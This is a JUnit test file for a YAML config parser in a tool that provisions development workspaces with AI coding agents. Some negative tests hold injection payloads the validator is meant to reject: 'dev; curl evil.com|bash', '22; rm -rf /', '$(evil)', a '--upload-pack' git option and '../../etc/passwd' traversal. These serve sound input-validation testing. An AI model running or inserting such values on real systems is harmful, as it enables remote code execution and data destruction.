/*
 * Copyright (c) 2026 Standard Applied Intelligence Labs
 * SPDX-License-Identifier: MIT
 */

package ai.singlr.sail.config;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

class SailYamlTest {

  private static final String EXAMPLE_YAML =
      """
        name: acme-health
        description: "Acme Health Platform"

        resources:
          cpu: 4
          memory: 12GB
          disk: 150GB

        image: ubuntu/24.04

        packages:
          - postgresql-client-16

        runtimes:
          jdk: 25
          node: 22
          maven: "3.9.9"

        git:
          name: "Acme Engineering"
          email: "eng@acme.com"
          auth: token

        repos:
          - url: "https://github.com/acme/backend.git"
            path: "acme-backend"
            branch: "main"
          - url: "https://github.com/acme/webapp.git"
            path: "acme-webapp"

        services:
          postgres:
            image: postgres:16
            ports: [5432]
            environment:
              POSTGRES_DB: acme
              POSTGRES_USER: dev
              POSTGRES_PASSWORD: dev
            volumes:
              - pgdata:/var/lib/postgresql/data

          meilisearch:
            image: getmeili/meilisearch:latest
            ports: [7700]

        processes:
          app:
            command: "java -jar build/app.jar"
            workdir: "."
          web:
            command: "npm run dev"
            workdir: "./webapp"

        agent:
          type: claude-code
          auto_branch: true
          branch_prefix: "sail/"
          auto_snapshot: true
          config:
            permissions: full

        agent_context:
          tech_stack: |
            Backend: JDK 25, Helidon 4.3.x
          conventions: |
            - Use virtual threads
          build_commands: |
            mvn clean package
          project_specific: |
            HIPAA compliance is critical.

        ssh:
          user: dev
          authorized_keys:
            - "ssh-ed25519 AAAA... alice@laptop"
        """;

  @Test
  void parsesCompleteYaml() throws Exception {
    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    assertEquals("acme-health", config.name());
    assertEquals("Acme Health Platform", config.description());
    assertEquals("ubuntu/24.04", config.image());

    assertEquals(4, config.resources().cpu());
    assertEquals("12GB", config.resources().memory());
    assertEquals("150GB", config.resources().disk());

    assertEquals(1, config.packages().size());
    assertEquals("postgresql-client-16", config.packages().getFirst());

    assertEquals(25, config.runtimes().jdk());
    assertEquals("22", config.runtimes().node());
    assertEquals("3.9.9", config.runtimes().maven());

    assertEquals("Acme Engineering", config.git().name());
    assertEquals("eng@acme.com", config.git().email());
    assertEquals("token", config.git().auth());

    assertEquals(2, config.repos().size());
    assertEquals("acme-backend", config.repos().getFirst().path());
    assertEquals("main", config.repos().getFirst().branch());
    assertEquals("acme-webapp", config.repos().get(1).path());
    assertNull(config.repos().get(1).branch());

    assertEquals(2, config.services().size());
    var pg = config.services().get("postgres");
    assertEquals("postgres:16", pg.image());
    assertEquals(5432, pg.ports().getFirst());
    assertEquals("acme", pg.environment().get("POSTGRES_DB"));

    assertEquals(2, config.processes().size());
    assertEquals("java -jar build/app.jar", config.processes().get("app").command());
    assertEquals("./webapp", config.processes().get("web").workdir());

    assertEquals("claude-code", config.agent().type());
    assertTrue(config.agent().autoBranch());
    assertEquals("sail/", config.agent().branchPrefix());
    assertTrue(config.agent().autoSnapshot());
    assertEquals("full", config.agent().config().get("permissions"));

    assertNotNull(config.agentContext());
    assertTrue(config.agentContext().techStack().contains("JDK 25"));
    assertTrue(config.agentContext().projectSpecific().contains("HIPAA"));

    assertEquals("dev", config.ssh().user());
    assertEquals(1, config.ssh().authorizedKeys().size());
  }

  @Test
  void repoFromMapRejectsUrlThatLooksLikeAGitOption() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                SailYaml.Repo.fromMap(
                    java.util.Map.of("url", "--upload-pack=touch /tmp/pwned", "path", "evil")));
    assertTrue(ex.getMessage().contains("repos[].url"));
  }

  @Test
  void repoFromMapRejectsUrlWithoutKnownScheme() {
    assertThrows(
        IllegalArgumentException.class,
        () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
  }

  @Test
  void repoFromMapAcceptsHttpsAndScpUrls() {
    var https =
        SailYaml.Repo.fromMap(
            java.util.Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
    assertEquals("https://github.com/acme/backend.git", https.url());

    var scp =
        SailYaml.Repo.fromMap(
            java.util.Map.of("url", "git@github.com:acme/backend.git", "path", "backend"));
    assertEquals("git@github.com:acme/backend.git", scp.url());
  }

  @Test
  void resourcesFromMapThrowsOnMissingCpu() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Resources.fromMap(java.util.Map.of("memory", "8GB", "disk", "50GB")));
    assertTrue(ex.getMessage().contains("resources.cpu"));
  }

  @Test
  void resourcesFromMapThrowsOnMissingMemory() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
    assertTrue(ex.getMessage().contains("resources.memory"));
  }

  @Test
  void runtimesDefaultsToZeroWhenMissing() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of());
    assertEquals(0, runtimes.jdk());
    assertNull(runtimes.node());
    assertNull(runtimes.maven());
  }

  @Test
  void runtimesFromMapParsesPartialConfig() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25));
    assertEquals(25, runtimes.jdk());
    assertNull(runtimes.node());
    assertNull(runtimes.maven());
  }

  @Test
  void runtimesFromMapParsesMaven() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
    assertEquals("3.9.9", runtimes.maven());
  }

  @Test
  void gitFromMapDefaultsAuthToToken() {
    var git = SailYaml.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
    assertEquals("token", git.auth());
  }

  @Test
  void gitFromMapAcceptsSshAuth() {
    var git =
        SailYaml.Git.fromMap(
            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
    assertEquals("ssh", git.auth());
  }

  @Test
  void gitFromMapThrowsOnMissingName() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Git.fromMap(java.util.Map.of("email", "test@test.com")));
    assertTrue(ex.getMessage().contains("git.name"));
  }

  @Test
  void gitFromMapThrowsOnMissingEmail() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Git.fromMap(java.util.Map.of("name", "Test")));
    assertTrue(ex.getMessage().contains("git.email"));
  }

  @Test
  void gitFromMapThrowsOnInvalidAuth() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                SailYaml.Git.fromMap(
                    java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "bad")));
    assertTrue(ex.getMessage().contains("git.auth"));
  }

  @Test
  void gitFromMapParsesSshKey() {
    var map = new java.util.HashMap<String, Object>();
    map.put("name", "Test");
    map.put("email", "test@test.com");
    map.put("auth", "ssh");
    map.put("ssh_key", "~/.ssh/id_ed25519");
    var git = SailYaml.Git.fromMap(map);
    assertEquals("ssh", git.auth());
    assertEquals("~/.ssh/id_ed25519", git.sshKey());
  }

  @Test
  void gitFromMapSshKeyNullWhenAbsent() {
    var git =
        SailYaml.Git.fromMap(
            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
    assertNull(git.sshKey());
  }

  @Test
  void gitToMapIncludesSshKeyWhenSet() {
    var git = new SailYaml.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
    var map = git.toMap();
    assertEquals("~/.ssh/id_ed25519", map.get("ssh_key"));
  }

  @Test
  void gitToMapOmitsSshKeyWhenNull() {
    var git = new SailYaml.Git("Test", "test@test.com", "token", null);
    var map = git.toMap();
    assertFalse(map.containsKey("ssh_key"));
  }

  @Test
  void gitSshKeyRoundTripsViaToMapFromMap() {
    var original = new SailYaml.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
    var roundTripped = SailYaml.Git.fromMap(original.toMap());
    assertEquals("ssh", roundTripped.auth());
    assertEquals("~/.ssh/id_ed25519", roundTripped.sshKey());
  }

  @Test
  void repoFromMapThrowsOnMissingUrl() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Repo.fromMap(java.util.Map.of("path", "my-repo")));
    assertTrue(ex.getMessage().contains("repos[].url"));
  }

  @Test
  void repoFromMapThrowsOnMissingPath() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "https://github.com/foo/bar")));
    assertTrue(ex.getMessage().contains("repos[].path"));
  }

  @Test
  void repoFromMapRejectsPathTraversal() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                SailYaml.Repo.fromMap(
                    java.util.Map.of(
                        "url", "https://github.com/foo/bar", "path", "../../etc/passwd")));
    assertTrue(ex.getMessage().contains("repos[].path"));
  }

  @Test
  void repoFromMapRejectsInvalidBranch() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                SailYaml.Repo.fromMap(
                    java.util.Map.of(
                        "url",
                        "https://github.com/foo/bar",
                        "path",
                        "app",
                        "branch",
                        "../escape")));
    assertTrue(ex.getMessage().contains("repos[].branch"));
  }

  @Test
  void sshFromMapRejectsInvalidUser() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
    assertTrue(ex.getMessage().contains("Invalid ssh.user"));
  }

  @Test
  void runtimesFromMapRejectsInvalidMavenVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
    assertTrue(ex.getMessage().contains("runtimes.maven"));
  }

  @Test
  void runtimesFromMapRejectsInvalidNodeVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
    assertTrue(ex.getMessage().contains("runtimes.node"));
  }

  @Test
  void serviceEnvironmentConvertsBooleanAndNumberValues() {
    var envMap = new java.util.LinkedHashMap<String, Object>();
    envMap.put("MEILI_ENV", "development");
    envMap.put("MEILI_NO_ANALYTICS", true);
    envMap.put("POOL_SIZE", 10);
    var serviceMap =
        java.util.Map.<String, Object>of("image", "meilisearch:latest", "environment", envMap);

    var service = SailYaml.Service.fromMap(serviceMap);

    assertEquals("development", service.environment().get("MEILI_ENV"));
    assertEquals("true", service.environment().get("MEILI_NO_ANALYTICS"));
    assertEquals("10", service.environment().get("POOL_SIZE"));
  }

  @Test
  void runtimesNodePreservesDoubleVersion() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
    assertEquals("22.4", runtimes.node());
  }

  @Test
  void runtimesNodeWholeDoubleBecomesInteger() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
    assertEquals("22", runtimes.node());
  }

  @Test
  void runtimesNodeStringVersionWithMultipleDots() {
    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
    assertEquals("24.13.1", runtimes.node());
  }

  @Test
  void sshUserReturnsSshUserWhenConfigured() throws Exception {
    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    assertEquals("dev", config.sshUser());
  }

  @Test
  void sshUserDefaultsToDevWhenNoSshBlock() throws Exception {
    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));

    assertEquals("dev", config.sshUser());
  }

  @Test
  void repoPathsReturnsAbsolutePathsForEachRepo() throws Exception {
    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    var paths = config.repoPaths();

    assertEquals(2, paths.size());
    assertEquals("/home/dev/workspace/acme-backend", paths.get(0));
    assertEquals("/home/dev/workspace/acme-webapp", paths.get(1));
  }

  @Test
  void repoPathsReturnsWorkspaceRootWhenNoRepos() throws Exception {
    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));

    var paths = config.repoPaths();

    assertEquals(1, paths.size());
    assertEquals("/home/dev/workspace", paths.getFirst());
  }

  @Test
  void repoPathsUsesSshUser() throws Exception {
    var yaml =
        """
        name: test
        ssh:
          user: alice
        repos:
          - url: "https://github.com/test/app.git"
            path: "app"
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertEquals("/home/alice/workspace/app", config.repoPaths().getFirst());
  }

  @Test
  void agentGuardrailsParsedFromYaml() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          guardrails:
            max_duration: 4h
            idle_timeout: 90m
            commit_burst: 20
            action: snapshot-and-stop
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNotNull(config.agent().guardrails());
    assertEquals("4h", config.agent().guardrails().maxDuration());
    assertEquals("snapshot-and-stop", config.agent().guardrails().action());
  }

  @Test
  void agentSpecsDirRejectsPathTraversal() {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          specs_dir: "../../etc"
        """;
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)));
    assertTrue(ex.getMessage().contains("agent.specs_dir"));
  }

  @Test
  void agentSpecsDirParsedFromYaml() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          specs_dir: specs
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertEquals("specs", config.agent().specsDir());
  }

  @Test
  void agentGuardrailsNullWhenNotConfigured() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNull(config.agent().guardrails());
    assertEquals("specs", config.agent().specsDir());
  }

  @Test
  void securityAuditParsedFromYaml() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          security_audit:
            enabled: true
            auditor: codex
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNotNull(config.agent().securityAudit());
    assertTrue(config.agent().securityAudit().enabled());
    assertEquals("codex", config.agent().securityAudit().auditor());
  }

  @Test
  void securityAuditEnabledWithoutExplicitAuditor() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          install:
            - codex
          security_audit:
            enabled: true
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNotNull(config.agent().securityAudit());
    assertTrue(config.agent().securityAudit().enabled());
    assertNull(config.agent().securityAudit().auditor());
    assertEquals(
        "codex",
        config.agent().securityAudit().resolveAuditor("claude-code", config.agent().install()));
  }

  @Test
  void securityAuditNullWhenNotConfigured() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNull(config.agent().securityAudit());
  }

  @Test
  void notificationsParsedFromYaml() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          notifications:
            url: "https://ntfy.sh/singlr-test"
            events:
              - guardrail_triggered
              - agent_exited
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNotNull(config.agent().notifications());
    assertEquals("https://ntfy.sh/singlr-test", config.agent().notifications().url());
    assertEquals(2, config.agent().notifications().events().size());
  }

  @Test
  void notificationsNullWhenNotConfigured() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    assertNull(config.agent().notifications());
  }

  @Test
  void handlesMinimalYaml() throws Exception {
    var minimal =
        """
            name: simple-project
            description: "Just a name and description"
            """;

    var config = SailYaml.fromMap(YamlUtil.parseMap(minimal));

    assertEquals("simple-project", config.name());
    assertNull(config.resources());
    assertNull(config.git());
    assertNull(config.repos());
    assertNull(config.services());
    assertNull(config.agent());
  }

  @Test
  void toMapRoundTripsCompleteConfig() throws Exception {
    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    var map = original.toMap();
    var roundTripped = SailYaml.fromMap(map);

    assertEquals(original.name(), roundTripped.name());
    assertEquals(original.description(), roundTripped.description());
    assertEquals(original.resources().cpu(), roundTripped.resources().cpu());
    assertEquals(original.resources().memory(), roundTripped.resources().memory());
    assertEquals(original.resources().disk(), roundTripped.resources().disk());
    assertEquals(original.image(), roundTripped.image());
    assertEquals(original.packages(), roundTripped.packages());
    assertEquals(original.runtimes().jdk(), roundTripped.runtimes().jdk());
    assertEquals(original.runtimes().node(), roundTripped.runtimes().node());
    assertEquals(original.runtimes().maven(), roundTripped.runtimes().maven());
    assertEquals(original.git().name(), roundTripped.git().name());
    assertEquals(original.git().email(), roundTripped.git().email());
    assertEquals(original.git().auth(), roundTripped.git().auth());
    assertEquals(original.git().sshKey(), roundTripped.git().sshKey());
    assertEquals(original.repos().size(), roundTripped.repos().size());
    assertEquals(original.repos().getFirst().url(), roundTripped.repos().getFirst().url());
    assertEquals(original.repos().getFirst().branch(), roundTripped.repos().getFirst().branch());
    assertEquals(original.services().size(), roundTripped.services().size());
    assertEquals(
        original.services().get("postgres").image(),
        roundTripped.services().get("postgres").image());
    assertEquals(original.processes().size(), roundTripped.processes().size());
    assertEquals(original.agent().type(), roundTripped.agent().type());
    assertEquals(original.agent().autoBranch(), roundTripped.agent().autoBranch());
    assertEquals(original.agent().autoSnapshot(), roundTripped.agent().autoSnapshot());
    assertEquals(original.ssh().user(), roundTripped.ssh().user());
    assertEquals(original.ssh().authorizedKeys(), roundTripped.ssh().authorizedKeys());
  }

  @Test
  void toMapOmitsNullFields() throws Exception {
    var minimal = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
    var map = minimal.toMap();

    assertEquals("test", map.get("name"));
    assertFalse(map.containsKey("resources"));
    assertFalse(map.containsKey("runtimes"));
    assertFalse(map.containsKey("git"));
    assertFalse(map.containsKey("repos"));
    assertFalse(map.containsKey("services"));
    assertFalse(map.containsKey("agent"));
    assertFalse(map.containsKey("ssh"));
  }

  @Test
  void toMapPreservesServiceEnvironment() throws Exception {
    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    var map = original.toMap();
    @SuppressWarnings("unchecked")
    var services = (java.util.Map<String, Object>) map.get("services");
    @SuppressWarnings("unchecked")
    var pg = (java.util.Map<String, Object>) services.get("postgres");
    @SuppressWarnings("unchecked")
    var env = (java.util.Map<String, String>) pg.get("environment");

    assertEquals("acme", env.get("POSTGRES_DB"));
    assertEquals("dev", env.get("POSTGRES_USER"));
  }

  @Test
  void toMapPreservesGuardrails() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          guardrails:
            max_duration: 4h
            action: snapshot-and-stop
          security_audit:
            enabled: true
            auditor: codex
        """;
    var original = SailYaml.fromMap(YamlUtil.parseMap(yaml));
    var map = original.toMap();
    var roundTripped = SailYaml.fromMap(map);

    assertEquals("4h", roundTripped.agent().guardrails().maxDuration());
    assertEquals("snapshot-and-stop", roundTripped.agent().guardrails().action());
    assertTrue(roundTripped.agent().securityAudit().enabled());
    assertEquals("codex", roundTripped.agent().securityAudit().auditor());
  }

  @Test
  void withNodeRuntimeAddsNodeToExistingRuntimes() throws Exception {
    var yaml =
        """
        name: test
        resources:
          cpu: 2
          memory: 4GB
          disk: 20GB
        runtimes:
          jdk: 25
          maven: "3.9.9"
        agent:
          type: codex
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    var updated = config.withNodeRuntime("24.14.1");

    assertEquals(25, updated.runtimes().jdk());
    assertEquals("24.14.1", updated.runtimes().node());
    assertEquals("3.9.9", updated.runtimes().maven());
    assertEquals("test", updated.name());
    assertEquals("codex", updated.agent().type());
  }

  @Test
  void withNodeRuntimeCreatesRuntimesWhenNull() {
    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));

    var updated = config.withNodeRuntime("22.0.0");

    assertNotNull(updated.runtimes());
    assertEquals("22.0.0", updated.runtimes().node());
    assertEquals(0, updated.runtimes().jdk());
    assertNull(updated.runtimes().maven());
  }

  @Test
  void withAgentInstallReplacesInstallList() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          auto_branch: true
          install:
            - claude-code
            - codex
        """;
    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));

    var updated = config.withAgentInstall(java.util.List.of("claude-code"));

    assertEquals(java.util.List.of("claude-code"), updated.agent().install());
    assertEquals("claude-code", updated.agent().type());
    assertTrue(updated.agent().autoBranch());
  }
}
